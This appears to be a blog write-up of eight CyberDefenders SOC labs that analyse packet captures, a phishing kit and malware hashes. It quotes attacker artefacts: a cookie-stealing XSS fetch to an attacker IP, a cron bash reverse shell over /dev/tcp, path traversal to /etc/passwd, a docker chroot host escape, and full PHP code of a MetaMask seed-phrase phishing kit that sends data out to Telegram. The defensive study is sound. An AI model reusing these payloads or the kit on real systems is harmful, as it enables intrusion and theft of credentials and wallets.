---
title: CyberDefenders' Lab
draft: false
date: 2026-10-30T03:16:38.930Z
categories:
  - Writeup
lastmod: 2026-11-14T08:54:31.439Z
description: Nothing is that serious, so please choose peace.
cover: https://i.pinimg.com/1200x/a3/8c/bd/a38cbd1d6d6a1c4519f204926e5eca9d.jpg
tags:
  - Network Forensics
  - Threat Intel
banner: https://i.pinimg.com/1200x/a3/8c/bd/a38cbd1d6d6a1c4519f204926e5eca9d.jpg
---

## 1. Jetbrains

- **Date**: Oct 22, 2026
- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 1
- **Category**: Network Forensics

We are presented with a packet capture and nine questions pertaining to it.

**Q1: Identifying the attacker's IP address helps trace the source and stop further attacks. What is the attacker's IP address?**

At first glance, the packet is fraught with a multitude of suspicious HTTP requests. Indeed, the vulnerability lies in the web server.

![.](/images/posts/0064.png)

The conversations of those HTTP stream reveals that there is an influx of requests from the IP `23.158.56.196`

![.](/images/posts/0065.png)

Moreover, those requests come in all sizes and shapes.

![.](/images/posts/0066.png)

To list a few suspicious HTTP payload in the packet:
```
- `GET /authenticationTest.html?csrf HTTP/1.1`
- `POST /generateId.html HTTP/1.1\r\n (application/x-www-form-urlencoded)`
- `POST /ajax.html HTTP/1.1\r\n (application/x-www-form-urlencoded)`
- `HTTP/1.1 200 (text/plain)`
- `GET /app/oauth/space/connections/project/_Root?fullMatch=false&capability=CREATE_SUB_CONNECTION&capability=ISSUE_USER_TOKEN&unwantedCapability=IS_SUB_CONNECTION&queryUserTokens=true&queryPendingType=true HTTP/1.1\r\n`
- `GET /admin/createProject.html?init=1&parentId=_Root&embedded=true&cameFromUrl=%2Ffavorite%2Fprojects HTTP/1.1\r\n`
- `POST /hax?jsp=/app/rest/users/id:2/tokens/mD5r0yemB0;.jsp HTTP/1.1\r\n`
```
![.](/images/posts/0067.png)

These are evidence of CSRF, [the Cross-Site Request Forgery attack](https://portswigger.net/web-security/csrf).

And they all coming from the aforementioned IP address, further reinforcing that it is indeed the attacker's.

`Answer: 23.158.56.196`

**Q2: To identify potential vulnerability exploitation, what version of our web server service is running?**

We've already known that HTTP requests are suspicious, as well as the attacker's IP address. Therefore let's apply the filter for that with: 

`ip.src == 23.158.56.196 && http`

In the response body of the request 

`GET /hax?jsp=/app/rest/server;.jsp`, 

you will find a metadata field called `<server version>`.

A more efficient method can be filtering for keyword, in this case, `server`.

`Answer: 2023.11.3`

**Q3: After identifying the version of our web server service, what CVE number corresponds to the vulnerability the attacker exploited?**

Upon looking up the vulnerability for TeamCity with the aforementioned server version, we found two relevant articles from [Splunk](https://www.splunk.com/en_us/blog/security/security-insights-jetbrains-teamcity-cve-2024-27198-and-cve-2024-27199.html) and [Rapid7](https://www.rapid7.com/blog/post/ra-cve-2024-27198-analysis/).

`Answer: CVE-2024-27198`

**Q4: What credentials did the attacker successfully use for Basic Auth against the TeamCity server?**

In the same request as of Q3, we can see the metadata (credentials) right down below.

`Answer: c91oyemw:CL5vzdwLuK`

**Q5: The attacker uploaded a webshell to ensure his access to the system. What is the name of the file that the attacker uploaded?**

> A web shell is a malicious script or small program uploaded to a compromised web server that lets an attacker control the server remotely through a standard web browser (HTTP or HTTPS). First, attackers break into a website or application by exploiting vulnerabilities such as unpatched software, weak passwords, file upload flaws, SQL injections,... Then, they upload a script written in a server-side language - most commonly PHP, ASP/ASPX, JSP, or Python - disguised as a normal file or hidden inside existing code. Instead of logging in through standard terminal tools (like SSH), the attacker could navigate to the uploaded script via a web URL and runs system commands, manages files, or accesses databases directly through the browser. Attackers use web shells during the post-exploitation phase for persistence, data theft, pivoting, or spreading malware.

Upon inspecting `POST /admin/pluginUpload.html` in the same HTTP stream, we can see the file that the attacker upload:

`Content-Disposition: form-data; name="file:fileToUpload"; filename="NSt8bHTg.zip"` 

Interestingly, scattering throughout the packet, we can also see the request with the name `POST /plugins/NSt8bHTg.jsp HTTP/1.1 (application/x-www-form-urlencoded)`, which is also the name of the file mentioned.

> This is an indication of a vulnerability called [Zip Slip](https://darkt.medium.com/zip-slip-leading-to-remote-command-execution-in-java-application-fd3c41150b71), wherein a malicious `.zip` file can contain path traversal filenames. If the application extracts the archive without validating file paths, the attacker can write a backdoor `.jsp` file directly into the server's web root, leading to Remote Code Execution (RCE).

`Answer: NSt8bHTg.zip`

**Q6: When did the attacker execute their first command via the web shell?**

Apply the filter for the attacker's IP address and the keyword "cmd":

`ip.addr == 23.158.56.196 && frame contains "cmd"`

Look for the first one (which is `cmd=ls`, executed via the `.jsp` web shell), and view the UTC Arrival Time.

`Answer: 2024-06-30 08:03`

**Q7: The attacker tampered with a text file that contained the credentials of the admin user of the webserver. What new username and password did the attacker write in the file?**

We keep searching along the lines of `cmd` (since the question tell us that the attacker **wrote** something). Indeed, we encounter a request that contains that mentioned command:

`cmd=bash -c echo "username:a1l4m,password:youarecompromised" > /tmp/Creds.txt`

`Answer: a1l4m:youarecompromised`

**Q8: Q7 showed the attacker writing false credentials into Creds.txt. Which MITRE ATT&CK sub-technique (Data Manipulation family) describes that specific file-write action?**

![image](/images/posts/dreamhack-933703/image-1792857821949-684f88.png)

Well, there is only three sub-techniques. Initially, I'm torn between Stored Data Manipulation (T1565.001) and Transmitted Data Manipulation (T1565.002)

> **Stored Data Manipulation (T1565.001)**: *"Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data. By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making."*
> 
> **Transmitted Data Manipulation (T1565.002)**: *"Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity, thus threatening the integrity of the data. By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making."*

After some pondering, well, we can come to a plausible conclusion that: the attacker used a web shell to run some commands to change data stored on the server, like, the `Creds.txt` is pretty much static. And there is no sign of altering any data en route to the server or modifying system processes that I know of.

`Answer: T1565.001`

**Q9: Immediately after gaining a shell, the attacker executed a docker command that mounted the host filesystem and chrooted into it - providing full host access. What was that exact command?**

The keyword this time to filter should be `docker` and `chroot`.

![image](/images/posts/dreamhack-933703/image-1792899790542-0fe7b0.png)


`Answer: docker run --rm -it -v /:/host ubuntu chroot /host`


## 2. RetailBreach

- **Date**: Oct 24, 2026
- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 1
- **Category**: Network Forensics

**Q1: Identifying an attacker's IP address is crucial for mapping the attack's extent and planning an effective response. What is the attacker's IP address?**

We can see that there are two different IP addresses in the HTTP session. The first client IP (135.143.142.5) logged in normally, while the second IP (111.224.180.128) failed initial login attempts, before hijacking the active session token.

`Answer: 111.224.180.128`

**Q2: The attacker used a directory brute-forcing tool to discover hidden paths. Which tool did the attacker use to perform the brute-forcing?**

We can see an influx of HTTP GET requests from the attacker, with the form of `./passwd`, `./htpasswd`, `/chpasswd`,... Upon clicking on these requests, we can see this directory brute-forcing use `gobuster`.

`Answer: gobuster`

**Q3: Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by users. Can you specify the XSS payload that the attacker used to compromise the integrity of the web application?**

Applying the filter for the IP address of the attacker, as well as the the keyword `script`, we can find out the XSS payload.

![image](/images/posts/dreamhack-933703/image-1792899900701-b0b553.png)

`Answer: <script>fetch('http://111.224.180.128/' + document.cookie);</script>`

**Q4: Pinpointing the exact moment an admin user encounters the injected malicious script is crucial for understanding the timeline of a security breach. Can you provide the UTC timestamp when the admin user first visited the page containing the injected malicious script?**

From the previous question, we can see that the attacker execute the XSS in `/reviews.php`. And we have also inferred that `135.143.142.5` is IP address of the admin. Therefore, we just need to locate the first time the admin access that page.

`Answer: 2024–03–29 12:09`

**Q5: The theft of a session token through XSS is a serious security breach that allows unauthorized access. Can you provide the session token that the attacker acquired and used for this unauthorized access?**

The admin encountered the malicious script in the previous question, and right after the attacker has successfully access the privilege unauthorizedly, from which you can see the session token.

`Answer: lqkctf24s9h9lg67teu8uevn3q`

**Q6: Identifying which scripts have been exploited is crucial for mitigating vulnerabilities in a web application. What is the name of the script that was exploited by the attacker?**

Let's utilize the newfounded session token. Filtering for the "session token" and the "attacker's IP address":

`ip.addr == 111.224.180.128 && frame contains "lqkctf24s9h9lg67teu8uevn3q"`

Among the request, there is this suspicious one:

`GET /admin/log_viewer.php?file=../../../../../etc/passwd`

This suggests the attacker was attempting to access sensitive system files via `?file=` parameter.

> `log_viewer.php` is a PHP script. It is commonly used as a web-based utility to read, format, and display server or application log files (such as Apache, Nginx, Dolibarr, or custom framework logs) directly inside a browser. In some web applications or plugins, `log_viewer.php` or similar log-viewing endpoints can also be targets for security vulnerabilities or exploitation if they lack proper authentication or input validation (such as path traversal or cross-site scripting).

`Answer: log_viewer.php`

**Q7: Exploiting vulnerabilities to access sensitive system files is a common tactic used by attackers. Can you identify the specific payload the attacker used to access a sensitive system file?**

The answer lies in the payload of the previous question. The script `log_viewer.php` is indeed accessed and exploited via path traversal.

`Answer: ../../../../../etc/passwd`

## 3. PsExec Hunt

- **Date**: Oct 24, 2026
- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 2
- **Category**: Network Forensics

**Q1. To effectively trace the attacker's activities within our network, can you identify the IP address of the machine from which the attacker initially gained access?**

At first glance, there is a large amount of traffic of SMB2 under NetBIOS.

![image](/images/posts/rstcon-ctf-2026-f495bb/image-1793246130295-3fbd9a.png)

> A large amount of SMB (Server Message Block) traffic running under NetBIOS usually indicates legacy Windows networking activity, active file/printer sharing, or a potential network scanning/malware spreading event.
> 
> In modern networks, SMB typically runs directly over TCP port 445 (Active Directory / Direct Host). When you see it heavily wrapped in NetBIOS (ports 137, 138, and 139), it points to specific architectural behaviors or anomalies.

There is also an influx of traffic from the IP address `10.0.0.130`.

![image](/images/posts/rstcon-ctf-2026-f495bb/image-1793245575147-b7164d.png)

And we can see that, across the SMB2 traffic, there is `10.0.0.131`, who is responsible for all the response. And there is `10.0.0.130`, the address behind all those requests. They share thousands of packet with each other.

![image](/images/posts/rstcon-ctf-2026-f495bb/image-1793246593913-250dae.png)

Moreover, the requests from `10.0.0.130` are particularly suspicious. There is one requesting admin, and there is one creating `PSEXESVC.exe`

![image](/images/posts/rstcon-ctf-2026-f495bb/image-1793284642779-1ac8f7.png)

From these information, I suppose we can conclude that `10.0.0.130` is our attacker's IP address.

`Answer: 10.0.0.130`

**Q2. To fully understand the extent of the breach, can you determine the machine's hostname to which the attacker first pivoted?**

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793351530886-04d018.png)

At first, I thought it was `Marketing-PC`, since there are early signs of enumeration targeting that host. However, there is something deeper than that.

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793350737246-61fb99.png)

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793351925671-4e8a53.png)

There are clusters of SMB2 traffic, which are attempting to:

**- Q3: NTLMSSP_AUTH, User: \ssales**

**- Q4: Write psexesvc.exe**

I suppose, these are signs of the attacker has successfully gained access of the workstation.

Upon follow those streams, (be it TCP or SMB2), we can see fragments of the workstation "SALES-PC" throughout the NTLMSSP payload. 

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793350902549-b83971.png)

This confirmed SALES-PC as the first machine the attacker compromised after gaining access.

`Answer: Sales-PC`

**Q3. Knowing the username of the account the attacker used for authentication will give us insights into the extent of the breach. What is the username utilized by the attacker for authentication?**

`Answer: ssales`

**Q4. After figuring out how the attacker moved within our network, we need to know what they did on the target machine. What's the name of the service executable the attacker set up on the target?**

`Answer: psexesvc.exe`

**Q5. We need to know how the attacker installed the service on the compromised machine to understand the attacker's lateral movement tactics. This can help identify other affected systems. Which network share was used by PsExec to install the service on the target machine?**

First things first, what is even network share?

> - *A network share is a resource on one computer that other computers can access over a network. It is usually a folder, but it can also be a printer or a service. Network Sharing Protocols include SMB, NFS, AFP.*
>
> - A network share is normally identified by the path `\\ComputerName\ShareName`. The `$` at the end of some Windows share names means the share is hidden from normal browsing. For example:
>   -  `\\PC\Documents` indicates a regular share
>   - `\\PC\C$` indicates a hidden administrative share

Across the packet, we can only see two network share (Tree Connect requests) `ADMIN$` and `IPC$`. They are built-in hidden administrative shares created automatically by Windows operating systems

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793627699063-952b11.png)

Let's delve into the function of both of the network shares.
- `ADMIN$ (Administration Share)` allows remote administrators with proper credentials to manage system files, deploy updates, or inspect configuration settings across the network without needing physical access to the machine.
- `IPC$ (Inter-Process Communication Share)` facilitates inter-process communication, named pipe connections, remote procedure calls (RPC), and authentication/permission checks between networked computers before other standard shares can be accessed.

That said, we now have the answer to Q5 and Q6.

`Answer: ADMIN$`

**Q6. We must identify the network share used to communicate between the two machines. Which network share did PsExec use for communication?**

`Answer: IPC$`


**Q7. Now that we have a clearer picture of the attacker's activities on the compromised machine, it's important to identify any further lateral movement. What is the hostname of the second machine the attacker targeted to pivot within our network?**

If you follow the stream chronologically, you can see that down the end of the packet, the target became `Marketing-PC` rather than the `Sales-PC` at the outset.

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793629966303-95d101.png)

`Answer: Marketing-PC`

## 4. Tomcat Takeover
- **Date**: Oct 30, 2026
- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 2
- **Category**: Network Forensics

> *"Apache Tomcat is a free and open-source implementation of the Jakarta EE Servlet, Pages, Expression Language, WebSocket, Annotations and Authentication technologies. It provides a "pure Java" HTTP web server environment in which Java code can also run."*

**Q1. Given the suspicious activity detected on the web server, the PCAP file reveals a series of requests across various ports, indicating potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?**

The `Dst. Port` of requests from the IP address `14.0.0.120` varies. 

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793631477202-e9b04a.png)
![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793631516127-8f7edd.png)
![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793631528974-5e3324.png)

Moreover, there is a suspiciously high volume of `TCP SYN` (initiate a connection) and `TCP RST/ACK` (acknowledge the request but reset/reject the connection) traffic in from the source to the destination, in a very short span.

That pattern strongly suggests an automated SYN port scan: one host is checking which ports respond. A large number of SYN packets aimed at one port could instead suggest a SYN flood. Traffic volume alone cannot prove intent; but if you know, you know.

`Answer: 14.0.0.120`

**Q2. Based on the identified IP address associated with the attacker, can you identify the country from which the attacker's activities originated?**

At first, I suppose we need to scavenger hunt this information in the packet capture, like other queries. However, it turns out that the intended approach is to perform an [IP lookup](https://www.ip2location.com/14.0.0.120). This effectively reveals the geological data of the IP address, which in fact originating in Guangzhou, China.

`Answer: China`

**Q3. From the PCAP file, multiple open ports were detected as a result of the attacker's active scan. Which of these ports provides access to the web server admin panel?**

After the incessant port scanning, `Dst. Port: 8080` finally provides a breakthrough, allowing the attacker to successfully call a `GET` request to the web server, and subsequently, access the admin panel.

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793633418373-780172.png)

`Answer: 8080`

**Q4. Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process?**

This is common knowledge, but to confirm the methodology, we have:

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793634198166-e20ff4.png)

`Answer: gobuster`

**Q5. After enumerating directories on our web server, the attacker made numerous requests to identify administrative interfaces. Which directory related to the admin panel did the attacker uncover? (Provide the path including the leading slash, e.g. /path)**

I attempted to inspect `GET /admin`, with a view to discover more about the admin panel.

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793635031299-91f5b3.png)

Noticeably, in the same stream, there is also a host of requests to the `/manager` directory. 

We can therefore infer that, the `/manager` directory (which has been discovered by the port scanner) seems to associated with the admin panel, in the Apache Tomcat web server.

`Answer: /manager`

**Q6. After accessing the admin panel, the attacker brute-forced the login. What credentials did the attacker successfully use? (Provide them in username:password format)**

Initially, I tried to filter for `username`

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793635670695-c0c7e2.png)

However, this is not the correct credential. To be fair, these TCP traffic do not reveal much, so let's try again with `manager` and `http`.

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793638606343-008f19.png)

This give us a much better view of what really happened. We can see that there is some trial and error at play, with multiple `401 Unauthorized`, suggesting that the attacker tried to login and failed multipled times.

The credential of their failed attempts is `dG9tY2F0OnMzY3IzdA==`, which is... `tomcat:s3cr3t`, similar to the one we have discovered above.

But in the end, the attacker has successfully accessed the admin panel via `/manager`, and call some suspicious actions such as

- `GET /manager/images/tomcat.gif HTTP/1.1`
- `GET /JXQOZY/ HTTP/1.1`

We can trace back to the successful authorization from those behaviors, which is the last `GET /manager/html` we can see in the image above. In fact, it used a rather different credential: `YWRtaW46dG9tY2F0==`, which is `admin:tomcat` - the correct answer to this question.

`Answer: admin:tomcat`

**Q7. Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data?**

Following the suspicious `GET /JXQOZY/ HTTP/1.1`, we can see that the attacker actually try to deploy the file `JXQOZY.war`

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793677380023-ee2454.png)

> A `.war` (Web Application Archive) file is a standard package format used to deploy Java-based web applications on web servers/servlet containers (Apache Tomcat, JBoss, WildFly). By itself, a `.war` file is just a ZIP archive containing Java classes, JSPs, HTML files, and configuration data.
>
> That said, `.war` (or `.jar` in general) is benign intrinsically. They only become malicious when an attacker embeds unauthorized code (web shell, backdoor, or RCE payload) inside the archive and deploys or uploads it to a vulnerable server.

Moreover, the file was in fact successfully uploaded and accessed by the attacker afterwards, resulting in the `HTTP/1.1 200 OK` response from the server.

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793679283691-136ae2.png)

`Answer: JXQOZY.war`

**Q8. After the attacker established a reverse shell on our server, the payload connects back to the attacker's machine. From the analysis, what is the callback destination in IP:port format?**

Having established the shell, the attacker performed a host of commands afterwards, such as `whoami`, `cd /tmp`, `pwd`. These are simple, but there is a more noteworthy command:

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793682176146-c509d8.png)

`echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'" > cron`

> `cron` is a time-based job scheduler in Unix-like operating systems, which can run scripts, commands, or software routines at specified times or regular intervals. A scheduled job is known as a `cron job`.

The command overwrites `cron`, rendering it to spawn the malicious reverse shell payload every minutes. Specificially, it redirects `stdin` and `stdout` to the open TCP connection at the IP address `14.0.0.120` on port `443`. This is typical of a persistent RCE.

`Answer: 14.0.0.120:443`

## 5. GrabThePhisher
- **Date**: Oct 30, 2026
- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 2
- **Category**: Threat Intel

We are presented with the filesystem of a webpage.

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793697271207-c171ec.png)

Go to `index.html`

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793697329233-28710a.png)

*I suppose the webpage is created for the purpose of social engineering with this suspicious interface...*

**Q1. Which wallet is used for asking the seed phrase?**

I tried to click on those wallets one by one, but there are no responses, except for MetaMask, which tells me `ERR_FILE_NOT_FOUND`. However, in the filesystem, we can see the folder `metamask`, inside which contains another `index.html`

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793697522218-c49d51.png)

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793697650252-fa0932.png)

`Answer: MetaMask`

This folder also contains `metamask.php`, making the next two questions pretty much no-brainers.

```php
<?php

$request = file_get_contents("http://api.sypexgeo.net/json/".$_SERVER['REMOTE_ADDR']); 
$array = json_decode($request);
$geo = $array->country->name_en;
$city = $array->city->name_en;
$date = date("m.d.Y"); //aaja


/*
 With love and respect to all the hustler out there,
 This is a small gift to my brothers,
 All the best with your luck,
 
 Regards, 
 j1j1b1s@m3r0
*/

    $message = "<b>Welcome 2 The Jungle </b> 
    
<b>Wallet:</b> Metamask
<b>Phrase:</b> <code>" . $_POST["data"] . "</code>
<b>IP:</b> " .$_SERVER['REMOTE_ADDR'] . " | " .$geo. " | " .$city. "
<b>User:</b> " . $_SERVER['HTTP_USER_AGENT'] . "";

sendTel($message);  
	
    function sendTel($message){
		$id = "5442785564"; 
        $token = "54574*****:*******************************vxm10"; 
		$filename = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$id."&text=".urlencode($message)."&parse_mode=html";
		file_get_contents($filename);
        $_POST["import-account__secret-phrase"]. $text = $_POST['data']."\n";;
        @file_put_contents($_SERVER['DOCUMENT_ROOT'].'/log/'.'log.txt', $text, FILE_APPEND);	
    }
      
?>
```

**Q2. What is the file name that has the code for the phishing kit?**

`Answer: metamask.php`

**Q3. In which language was the kit written?**

`Answer: PHP`

**Q4. What service does the kit use to retrieve the victim's machine information?**

Upon inspecting the PHP code:

```php
$request = file_get_contents("http://api.sypexgeo.net/json/".$_SERVER['REMOTE_ADDR']); 
$array = json_decode($request);
$geo = $array->country->name_en;
$city = $array->city->name_en;
$date = date("m.d.Y"); //aaja
```

I know nothing of `Sypex Geo`, but:

- `http://api...` resembles some kind of services
- There is `$request`, and `$array`, `$geo`, `$city`, `$date`, all of which seems to extract sensitive geographical information.
- The `geo` in `sypexgeo` may stand for `geography`.

> Sypex Geo is a high-speed, lightweight tool used to identify a visitor's country, region, city, and geographic coordinates from an IP address

`Answer: Sypex Geo`

**Q5. How many seed phrases were already collected?**

```php
file_get_contents($filename);
$_POST["import-account__secret-phrase"]. $text = $_POST['data']."\n";;
@file_put_contents($_SERVER['DOCUMENT_ROOT'].'/log/'.'log.txt', $text, FILE_APPEND);
```
I suppose the phrases are stored in `/log/log.txt`

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793698914298-02a847.png)

`Answer: 3`

**Q6. Could you please provide the seed phrase associated with the most recent phishing incident?**

`Answer: father also recycle embody balance concert mechanic believe owner pair muffin hockey`

**Q7. Which medium was used for credential dumping?**

```php
$filename = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$id."&text=".urlencode($message)."&parse_mode=html";
```

`Answer: Telegram`

**Q8. What is the token for accessing the channel?**

```php
$token = "54574*****:*******************************vxm10";
```

`Answer: 54574*****:*******************************vxm10`

**Q9. What is the Chat ID for the phisher's channel?**

```php
$id = "5442785564";
```

`Answer: 5442785564`

**Q10. What are the allies of the phish kit developer?**

We can see their names in the comment/message.

`Answer: j1j1b1s@m3r0`

## 6. Yellow RAT
- **Date**: Oct 30, 2026
- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 2
- **Category**: Threat Intel

We are presented with a malware hash `30E527E45F50D2BA82865C5679A6FA998EE0A1755361AB01673950810D071C85`, and we are prompted to gather intel on this malware using online platforms.

**Q1. What name does Red Canary use for the threat cluster associated with the SHA256 in hash.txt? Submit the name used in its technical analysis, without adding a malware-type suffix.**

> In digital forensics, a threat cluster is a group of suspicious activities or incidents that investigators link through shared evidence. That evidence might include malware, attacker controlled servers, commands, or methods used to gain access. Analysts use the cluster to track a pattern while they investigate who is responsible.

With some researches, I stumbled upon this [blog](https://www.zscaler.com/blogs/product-insights/yellow-cockatoo) about the given hash, which reveals that the threat cluster is **Yellow Cockatoo**.

`Answer: Yellow Cockatoo`

**Q2. As part of our incident response, knowing the malware's common filenames can help us scan other workstations for potential infection. What is the common filename associated with this malware? (Use VirusTotal)**

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794191943096-7d0c0c.png)

The common filename associated with the malware is shown as above.

`Answer: 111bc461-1ca8-43c6-97ed-911e0e69fdf8.dll`

**Q3. Determining a malware sample's compilation timestamp can reveal insights into its development and deployment timeline. What compilation timestamp does VirusTotal show for this malware sample?**

*Details > History > Creation Time*

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794192034936-f913d4.png)

`Answer: 2020-09-24 18:26`

**Q4. Understanding when the broader cybersecurity community first identified the malware could help determine how long the malware might have been in the environment before detection. When was the malware first submitted to VirusTotal?**

*Details > History > First Submission*

`Answer: 2020-10-15 02:47`

**Q5. To completely eradicate the threat from Industries' systems, we need to identify all components dropped by the malware. What is the name of the .dat file that the malware dropped in the AppData folder?**

To fully understand how the malware really works, see more in the aforementioned [blog](https://www.zscaler.com/blogs/product-insights/yellow-cockatoo).

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794192415554-c58b23.png)

`Answer: solarmarker.dat`

**Q6. It is crucial to identify the C2 servers with which the malware communicates to block its communication and prevent further data exfiltration. What is the C2 server that the malware is communicating with?**

Again, read the above documentation:

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794195762789-b5f95c.png)

You can also find the server in VirusTotal (*Behavior > Activity Summary*)

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794195643873-820a61.png)

`Answer: https://gogohid.com`

## 7. IcedID
- **Date**: Oct 30, 2026
- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 2
- **Category**: Threat Intel

We are presented with a malware hash `191eda0c539d284b29efe556abb05cd75a9077a0`, and we are prompted to gather intel on this malware using online platforms.

**Q1. What is the name of the file associated with the given hash?**

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794198219949-c57506.png)

`Answer: document-1982481273.xlsm`

**Q2. Can you identify the filename of the GIF file that was deployed?**

*Relations > Connected URLs*

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794199472749-092fe3.png)

`Answer: 3003.gif`

**Q3. How many domains does the malware look to download the additional payload file in Q2?**

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794200473506-781be1.png)

`Answer: 5`

**Q4. From the domains mentioned in Q3, a DNS registrar was predominantly used by the threat actor to host their harmful content, enabling the malware's functionality. Can you specify the Registrar INC of the domain that end with .com?**

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794200453116-59f1b0.png)

From **Q2** and **Q3**, we can see that there is only one Contacted Domain overlaps with the Contacted URL that deploy the `3003.gif`, which is `tajushariya.com`. Its registrar is `NameCheap, Inc.`

`Answer: NAMECHEAP`

**Q5. Could you specify the threat actor linked to the sample provided?**

According to this page [malpedia](https://malpedia.caad.fkie.fraunhofer.de/details/win.icedid), the threat actor behind IcedID is `GOLD CABIN`

`Answer: GOLD CABIN`

**Q6. In the Execution phase, what function does the malware employ to fetch extra payloads onto the system?**

The malware is distributed on Microsoft Excel, Windows. On Windows, `URLDownloadToFile` is a common function for downloading an additional file onto the system. Here we need the ANSI version of it, `URLDownloadToFileA`. The A in the function means it expects those strings for the URL and file path.

> Reference:
> - https://www.fortinet.com/blog/threat-research/icedid-malware-analysis-part-two
> - https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775123(v=vs.85)

`Answer: URLDownloadToFileA`

## 8. Red Stealer
- **Date**: Nov 10, 2026
- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 3
- **Category**: Threat Intel

We are presented with a malware hash `248FCC901AFF4E4B4C48C91E4D78A939BF681C9A1BC24ADDC3551B32768F907B`, and we are prompted to gather intel on this malware using online platforms.

**Q1. Categorizing malware enables a quicker and clearer understanding of its unique behaviors and attack vectors. What category has Microsoft identified for that malware in VirusTotal?**

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794396882695-2b3cc7.png)

With Microsoft's threat naming convention and categorization, Trojan should be the correct answer here.

`Answer: Trojan`

**Q2. Clearly identifying the name of the malware file improves communication among the SOC team. What is the file name associated with this malware? Note: Don't include the file extension in the name.**

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794397061680-8269e5.png)

`Answer: Wextract`

**Q3. Knowing the exact timestamp of when the malware was first observed can help prioritize response actions. Newly detected malware may require urgent containment and eradication compared to older, well-documented threats. What is the UTC timestamp of the malware's first submission to VirusTotal?**

*Details > History > First Submission*

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794397386975-85f053.png)

`Answer: 2023-10-06 04:41`

**Q4. Understanding the techniques used by malware helps in strategic security planning. What is the MITRE ATT&CK technique ID for the malware collecting data from the local system prior to exfiltration?**

Researching with such keywords from the question, I stumbled upon [MITRE ATT&CK technique ID T1005, Data from Local System](https://attack.mitre.org/techniques/T1005/)

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794397252708-ff5208.png)

`Answer: T1005`

**Q5. Following execution, the malware performs a connectivity check by resolving a well-known social-media domain before contacting its C2. Which single domain does it resolve for this check?**

There are multiple traces of `facebook.com` in *Relations > Contacted URLs & Contacted Domains*

`Answer: facebook.com`

**Q6. Once the malicious IP addresses are identified, network security devices such as firewalls can be configured to block traffic to and from these addresses. Can you provide the IP address and destination port the malware communicates with?**

*Behavior > Network Communication > IP Traffic & Memory Pattern URLs/IPs*

`Answer: 77.91.124.55:19071`

**Q7. YARA rules are designed to identify specific malware patterns and behaviors. Using MalwareBazaar, what's the name of the YARA rule created by "Varp0s" that detects the identified malware?**

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794404797829-207597.png)

> **YARA** allows analysts to create custom descriptions, known as **YARA** rules, that capture the "DNA" of malware families. These rules combine textual strings, hexadecimal sequences, and regular expressions with Boolean logic. Instead of relying strictly on fragile file hashes (which change if a single byte is altered), **YARA** scans files, memory processes, or directories for specific code fragments, configurations, or behavioral patterns.


Go to *MalwareBazaar > Browse* with the search syntax `sha256:248fcc901aff4e4b4c48c91e4d78a939bf681c9a1bc24addc3551b32768f907b`

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794404462724-c0558c.png)

*Click on the only result found*

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794404624727-5e984c.png)

*Go to YARA*

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794404669377-2f9a1b.png)

`Answer: detect_Redline_Stealer`

**Q8. Understanding which malware families are targeting the organization helps in strategic security planning for the future and prioritizing resources based on the threat. Can you provide the different malware alias associated with the malicious IP address according to Malpedia?**

